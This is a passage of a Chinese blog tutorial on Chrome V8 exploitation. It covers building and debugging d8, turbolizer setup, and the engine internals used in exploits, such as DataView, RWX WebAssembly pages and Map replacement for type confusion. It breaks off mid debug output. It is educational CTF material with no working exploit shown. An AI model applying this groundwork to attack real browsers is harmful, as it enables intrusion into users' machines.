<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="ubuntu-18-04"><a href="#ubuntu-18-04" class="headerlink" title="ubuntu 18.04"></a>ubuntu 18.04</h2><h3 id="编译-v8"><a href="#编译-v8" class="headerlink" title="编译 v8"></a>编译 v8</h3><p>首先下载用于 <code>Chromium</code> 开发的工具 <code>depot_tools</code> 。这个工具用于 <code>v8</code> 的编译。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br></pre></td></tr></table></figure></div>

<p>将 <code>depot_tools</code> 添加到环境变量 <code>PATH</code> 的末尾</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:&lt;path to depot_tools&gt;</span><br></pre></td></tr></table></figure></div>

<p>挂好代理，进入到 <code>depot_tools</code> 。直接安装会 <code>ninja</code> 报错需要先将版本回退到 <code>138bff28</code>** 并且将 <code>DEPOT_TOOLS_UPDATE</code> 设为 0 。之后更新 <code>depot_tools</code> 。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 138bff28</span><br><span class="line">export DEPOT_TOOLS_UPDATE=0</span><br><span class="line">gclient</span><br></pre></td></tr></table></figure></div>

<p>出现以下界⾯说明更新成功<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/076214d58c9f667947cff193c11a4953.png"
                      alt="在这里插入图片描述"
                ><br>下载 <code>v8</code>，这个时间比较长，下载完后目录下会多一个 <code>v8</code> 文件夹。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch v8</span><br></pre></td></tr></table></figure></div>

<p>出现如下报错是因为之前 fetch 过，<code>depot_tools</code> 有相关记录，需要添加 <code>--force</code> 参数强制下载。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch --force v8</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/2d9e60b57c9b91542e571dad74d9e54e.png"
                      alt="在这里插入图片描述"
                ></p>
<p>根据题目需求 <code>git checkout</code> 切换 <code>v8</code> 版本，然后 <code>gclient sync -D</code> 下载相关依赖，<code>-D</code> 会删除不需要的依赖。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd v8</span><br><span class="line">git checkout  7.6.303.28</span><br><span class="line">gclient sync -D</span><br></pre></td></tr></table></figure></div>

<p>如果 <code>gclient sync</code> 出现如下报错则尝试下面这条命令（<del>貌似也不太行</del> ）</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gclient config https://chromium.googlesource.com/v8/v8</span><br></pre></td></tr></table></figure></div>

<p>其实这个报错很有可能是修改了 <code>v8</code> 文件夹名称或移动目录导致的，因为每次 <code>fetch v8</code> 在 <code>depot_tools</code> 中都会有相关的记录，<code>sync</code> 需要这些记录 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/a9e1104bf1f94c6b840269b8dd3100b5.png"
                      alt="在这里插入图片描述"
                ></p>
<ul>
<li><p>如果题目给的是一个 Chrome 浏览器那么首先安装浏览器然后再网址栏中输入 <code>chrome://version</code> 查看版本，例如：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">112.0.5615.87 (正式版本) （64 位） (cohort: Bypass) </span><br></pre></td></tr></table></figure></div>

<p>打开 github 的 <a class="link"   target="_blank" rel="noopener" href="https://github.com/chromium/chromium" >chrome <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 项目，搜索版本号并切换至相应版本。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/7478b65db9045f2215b821e9a1e2267f.png"
                      alt="在这里插入图片描述"
                ><br>然后在项目根目录下的 <code>DEPS</code> 文件中查看 <code>V8</code> 版本：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/aae0870ac00cce5722ced9f43d894b24.png"
                      alt="在这里插入图片描述"
                ></p>
</li>
<li><p>如果题目给了 <code>diff</code> 文件需要将 patch 到项目中。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git apply ./oob.diff</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>之后安装相关依赖，如果遇到下载字体未响应问题需要添加 <code>--no-chromeos-fonts</code> 参数。（每次换版本都要运行，否则 gdb 插件的 job 功能不正常）</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./build/install-build-deps.sh</span><br></pre></td></tr></table></figure></div>

<p>编译 <code>v8</code> ，这里选的 <code>release</code> 版本。<code>debug</code> 版本改为 <code>x64.debug</code> ，32 为版本将 <code>x64</code> 改为 <code>ia32</code> 。如果调试漏洞的话, 最好选择 <code>release</code> 版本 因为 <code>debug</code> 版本可能会有很多检查。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure></div>
<p>另外如果出现路径错误需要切换到 <code>./tools/dev/</code> 路径再进行编译。不过这样编译最终生成的 <code>d8</code> 在 <code>tools/dev/out/x64.release</code> 目录下。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/a1051554575e9c61f1d78692a54147f7.png"
                      alt="在这里插入图片描述"
                ><br>完成后是这个样子<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/cfe38b05694d9aeba1e2732c7f9566db.png"
                      alt="在这里插入图片描述"
                ><br>出现这个错误是因为 <code>out</code> 目录下的 <code>x64.release</code> 文件夹没有删。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/2a1d0f71ecf94af51fcd70c0ff475d20.png"
                      alt="在这里插入图片描述"
                ></p>
<p>编译生成的 <code>d8</code> 在 <code>./out/x64.release/d8</code> 中。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/3ae53b580f94b64b7d4b3c08b2c4b409.png"
                      alt="在这里插入图片描述"
                ></p>
<h3 id="调试-v8"><a href="#调试-v8" class="headerlink" title="调试 v8"></a>调试 v8</h3><p>在 <code>~/.gdbinit</code> 添加 <code>v8</code> 的调试插件：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">source /path/to/v8/tools/gdbinit</span><br><span class="line">source /path/to/v8/tools/gdb-v8-support.py</span><br></pre></td></tr></table></figure></div>

<p>常见参数：</p>
<ul>
<li><code>--allow-natives-syntax</code> 开启原生API (用的比较多)</li>
<li><code>--trace-turbo</code> 跟踪生成TurboFan IR</li>
<li><code>--print-bytecode</code> 打印生成的bytecode</li>
<li><code>--shell</code> 运行脚本后切入交互模式</li>
<li>更多参数可以参考 <code>--help</code></li>
</ul>
<p>调试 js 脚本时可以采用如下命令：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb ./d8</span><br><span class="line">r --allow-natives-syntax --shell ./exp.js</span><br></pre></td></tr></table></figure></div>

<p>js中常见的⼀些调试技巧：</p>
<ul>
<li>在js中写⼊断点：<code>%SystemBreak();</code> ，如果不在调试模式的话, 程序直接中断, 如果在调试器中, 会被调试器识别到<br>并且断下来。</li>
<li>打印出对象的地址和对应的信息: <code>%DebugPrint(var_name);</code></li>
<li>调试时输入 <code>job + DebugPrint打印的对象地址</code> 可以打印出对象的结构。</li>
</ul>
<h3 id="安装-turbolizer"><a href="#安装-turbolizer" class="headerlink" title="安装 turbolizer"></a>安装 turbolizer</h3><p><code>turbolizer</code> 是一个可视化分析 JS 优化的工具，安装命令如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install npm</span><br><span class="line">cd /path/to/v8/tools/turbolizer</span><br><span class="line">sudo npm install n -g</span><br><span class="line">sudo n 16.20.0 # sudo n latest</span><br><span class="line">sudo npm i</span><br><span class="line">sudo npm run-script build</span><br></pre></td></tr></table></figure></div>

<p>由于 Ubuntu18.04 默认的 <code>node</code> 版本过低，需要安装 <code>16.20.0</code> 版本。另外 <code>sudo npm i</code> 如果成功结果如下图：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/6abb1619281f83f884e392cd9bb9b40d.png"
                      alt="在这里插入图片描述"
                ></p>
<p>最后需要启动一个 web 服务器，根据需要 8000 可以换成其它端口。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure></div>

<p>编写一个 js 脚本：<br><code>%OptimizeFunctionOnNextCall</code> 内置函数可以直接触发强行触发优化。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//%OptimizeFunctionOnNextCall(add);</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10000000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">add</span>(i, i + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>运行 js 脚本并使用 <code>--trace-turbo</code> 参数</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./d8 --trace-turbo --allow-natives-syntax ./test.js</span><br></pre></td></tr></table></figure></div>

<p>此时会生成如下文件：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/d6c28ea4d12dd171e9d98e68da5b328f.png"
                      alt="在这里插入图片描述"
                ><br>在浏览器（<strong>最好使用 Chrome 浏览器，系统自带的火狐浏览器可能有问题。</strong>）中访问 <code>http://127.0.0.1:8000/path/to/v8/tools/turbolizer/</code>（注意，这里的路径是相对于 python 启动的 web 服务的路径的相对路径而不是绝对路径） ，然后在其中打开该文件就可以进行分析。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/4c5ccd404575542afecdabd6829685b5.png"
                      alt="在这里插入图片描述"
                ></p>
<h2 id="ubuntu-20-04-及以上（推荐）"><a href="#ubuntu-20-04-及以上（推荐）" class="headerlink" title="ubuntu 20.04 及以上（推荐）"></a>ubuntu 20.04 及以上（推荐）</h2><h3 id="编译-v8-1"><a href="#编译-v8-1" class="headerlink" title="编译 v8"></a>编译 v8</h3><p>下载 <code>depot_tools</code></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line">export PATH=$PATH:&lt;path to depot_tools&gt;</span><br><span class="line">cd depot_tools</span><br><span class="line">gclient</span><br></pre></td></tr></table></figure></div>
<p>下载、编译 v8</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fetch v8</span><br><span class="line">cd v8</span><br><span class="line">gclient sync -D</span><br><span class="line">./build/install-build-deps.sh</span><br><span class="line">./tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure></div>
<p>注意要确保 <code>ninja-build</code> 已安装。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install ninja-build</span><br></pre></td></tr></table></figure></div>
<h3 id="安装-turbolizer-1"><a href="#安装-turbolizer-1" class="headerlink" title="安装 turbolizer"></a>安装 turbolizer</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install npm</span><br><span class="line">sudo npm install -g npm # 升级 npm 到最新版</span><br><span class="line">cd /path/to/v8/tools/turbolizer</span><br><span class="line">sudo npm install n -g</span><br><span class="line">sudo n latest # 升级 nodejs 到最新版</span><br><span class="line">sudo npm i</span><br><span class="line">sudo npm run-script build</span><br></pre></td></tr></table></figure></div>
<h1 id="浏览器利用常用的class"><a href="#浏览器利用常用的class" class="headerlink" title="浏览器利用常用的class"></a>浏览器利用常用的class</h1><h2 id="数组-Array"><a href="#数组-Array" class="headerlink" title="数组 Array"></a>数组 Array</h2><ul>
<li>数组是JS最常用的class之一，它可以存放任意类型的js object。</li>
<li>有一个 <code>length</code> 属性，可以通过下标来线性访问它的每一个元素。</li>
<li>有许多可以修改元素的接口。</li>
<li>当元素为object时，只保留指针。</li>
</ul>
<h2 id="ArrayBuffer-和-DataView"><a href="#ArrayBuffer-和-DataView" class="headerlink" title="ArrayBuffer 和 DataView"></a>ArrayBuffer 和 DataView</h2><h3 id="ArrayBuffer"><a href="#ArrayBuffer" class="headerlink" title="ArrayBuffer"></a>ArrayBuffer</h3><p><code>ArrayBuffer</code> 对象用来表示通用的、固定长度的原始二进制数据缓冲区。<code>ArrayBuffer</code> 不能直接操作，而是要通过类型数组对象或 <code>DataView</code> 对象来操作，它们会将缓冲区中的数据表示为特定的格式，并通过这些格式来读写缓冲区的内容。</p>
<ul>
<li><p>语法</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(length)</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>参数</p>
<ul>
<li><code>length</code> 要创建的 <code>ArrayBuffer</code> 的大小，单位为字节。</li>
</ul>
</li>
<li><p>返回值：一个指定大小的 <code>ArrayBuffer</code> 对象，其内容被初始化为 <code>0</code> 。</p>
</li>
</ul>
<h3 id="DataView"><a href="#DataView" class="headerlink" title="DataView"></a>DataView</h3><p> <code>DataView</code> 是一个可以从 <code>ArrayBuffer</code> 对象中读写多种数值类型的底层接口，使用它时，不用考虑不同平台的字节序问题。</p>
<ul>
<li><p>语法</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">DataView</span>(buffer [, byteOffset [, byteLength]])</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>参数</p>
<ul>
<li><code>buffer</code>：一个 <code>ArrayBuffer</code> 或 <code>SharedArrayBuffer</code>  对象，<code>DataView</code> 对象的数据源。</li>
<li><code>byteOffset</code>（可选）：此 <code>DataView</code> 对象的第一个字节在 <code>buffer</code> 中的偏移。如果未指定，则默认从第一个字节开始。</li>
<li><code>byteLength</code>（可选）：此 <code>DataView</code> 对象的字节长度。如果未指定，则默认与 <code>buffer</code> 的长度相同。</li>
</ul>
</li>
<li><p>返回值：一个 <code>DataView</code> 对象，用于呈现指定的缓存区数据。你可以把返回的对象想象成一个二进制 <code>array buffer</code> 的“解释器”——它知道如何在读取或写入时正确地转换字节码。这意味着它能在二进制层面处理整数与浮点转化、字节顺序等其他有关的细节问题。</p>
</li>
</ul>
<h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p>例如下面这段代码</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="title class_">DataView</span>(ab);</span><br><span class="line">dv.<span class="title function_">setUint32</span>(<span class="number">0</span>, <span class="number">0xdeadbeef</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dv.<span class="title function_">getUint16</span>(<span class="number">2</span>, <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(dv);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure></div>

<p>这段代码输出结果是 57005 ，即 0xdead 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/c73ed9e6cf4d28ded671bc1c1e9338fb.png"
                      alt="在这里插入图片描述"
                ></p>
<h2 id="WASM（WebAssembly）"><a href="#WASM（WebAssembly）" class="headerlink" title="WASM（WebAssembly）"></a>WASM（WebAssembly）</h2><ul>
<li><p>顾名思义，是Asm on the web 。但其实不是真正意义上的汇编，只是更加接近汇编。</p>
</li>
<li><p>常用接口有</p>
<ul>
<li><code>WebAssembly.Module()</code>：创建一个新的 WebAssembly 模块对象。</li>
<li><code>WebAssembly.Instance()</code>：创建一个新的 WebAssembly 实例对象。</li>
<li><code>WebAssembly.Memory()</code>：创建一个新的 WebAssembly 内存对象。</li>
<li><code>WebAssembly.Table()</code>：创建一个新的 WebAssembly 表格对象。</li>
</ul>
</li>
<li><p>最重要的特点：可以在 Javascript Engine 的地址空间中导入一块可读可写可执行的内存页。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code), &#123;&#125;);</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/1183634adb9db86c2a83a979abe4d505.png"
                      alt="在这里插入图片描述"
                ></p>
</li>
</ul>
<h1 id="V8-的-object-通用结构"><a href="#V8-的-object-通用结构" class="headerlink" title="V8 的 object 通用结构"></a>V8 的 object 通用结构</h1><ul>
<li><code>Object</code> 可以拥有任意属性</li>
<li>属性名可以是数字和字母的组合</li>
<li>名字为数字的属性被称作 <code>element</code> ，其他的被称作 <code>property</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/593f5ca0dd5af835b2cc59a27f0c560d.png"
                      alt="在这里插入图片描述"
                ></li>
</ul>
<h2 id="Hidden-Class-Map"><a href="#Hidden-Class-Map" class="headerlink" title="Hidden Class (Map)"></a>Hidden Class (Map)</h2><p><code>Hidden Class</code> 也被称作 <code>Object Map</code>，简称 <code>Map</code>。位于 <code>V8 Object</code> 的第一个 8 字节。<br>任何由 <code>v8 gc</code> 管理的 <code>Js Object</code> ，它的前 8 个字节（或者在 32 位上是前四个字节）都是⼀个指向 <code>Map</code> 的指针。<br><code>Map</code> 中比较重要的字段是一个指向 <code>DescriptorArray</code> 的指针，里面包含有关name properties的信息，例如属性名和存储属性值的位置。<br>具有相同 <code>Map</code> 的两个 <code>JS object</code> ，就代表具有相同的类型（即具有以相同顺序命名的相同属性），比较 <code>Map</code> 的地址即可确定类型是否⼀致，同理，替换掉 <code>Map</code> 就可以进行类型混淆。</p>
<p><strong>在一些利用中，可以通过伪造 <code>Type</code> 字段来伪造 <code>Map</code> 。</strong></p>
<h2 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h2><p><code>Properties</code> 用于保持非数字索引的属性，分为 <code>Inline Property</code> ，<code>Fast Properties</code> 和 <code>Dictionary Properties</code> 。</p>
<h3 id="Inline-Property"><a href="#Inline-Property" class="headerlink" title="Inline Property"></a>Inline Property</h3><p>即 <code>in-object proterty</code> ，存放在 <code>object</code> 本身，而不是在 <code>Properties</code> 指针指向的内存，需要 <code>Descriptor Array</code> 。</p>
<h3 id="Fast-Properties"><a href="#Fast-Properties" class="headerlink" title="Fast Properties"></a>Fast Properties</h3><p><code>Fast Properties</code> 线性保存在 <code>Properties</code> 指针指向的内存中，需要 <code>Descriptor Array</code> 。</p>
<h3 id="Dictionary-Properties"><a href="#Dictionary-Properties" class="headerlink" title="Dictionary Properties"></a>Dictionary Properties</h3><p><code>Dictionary Properties</code> 即 <code>Slow Properties</code>，以哈希表的形式保存在 <code>Properties</code> 指针指向的内存中，不需要  <code>Descriptor Array</code> 。</p>
<h2 id="Elements"><a href="#Elements" class="headerlink" title="Elements"></a>Elements</h2><p><code>Elements</code> 用于保存数字索引的属性。</p>
<h3 id="Packed-Elements-Holey-Elements"><a href="#Packed-Elements-Holey-Elements" class="headerlink" title="Packed Elements &amp; Holey Elements"></a>Packed Elements &amp; Holey Elements</h3><p>如果各个属性之间连续，那么可以直接开一个数组（下标从 0 开始）来表示 <code>Elements</code>，如果有的下标没有对应的属性则数组中该下标对应的值为一个特殊值，此时这个 <code>Elements</code> 被称为 <code>Holey Elements</code> 。如果数组中每个下标都对应属性则这个 <code>Elements</code> 被称为 <code>Packed Elements</code> 。</p>
<p>例如下面这个脚本：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> a = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> a[<span class="number">1</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a[<span class="number">1</span>]);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"></span><br><span class="line">a.<span class="property">__proto__</span> = &#123;<span class="number">1</span>: <span class="string">&#x27;B&#x27;</span>, <span class="number">2</span>: <span class="string">&quot;C&quot;</span>&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a[<span class="number">0</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a[<span class="number">1</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a[<span class="number">2</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a[<span class="number">3</span>]);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure></div>

<p>调试结果如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">0x37815f38bba9 &lt;JSArray[3]&gt;</span><br><span 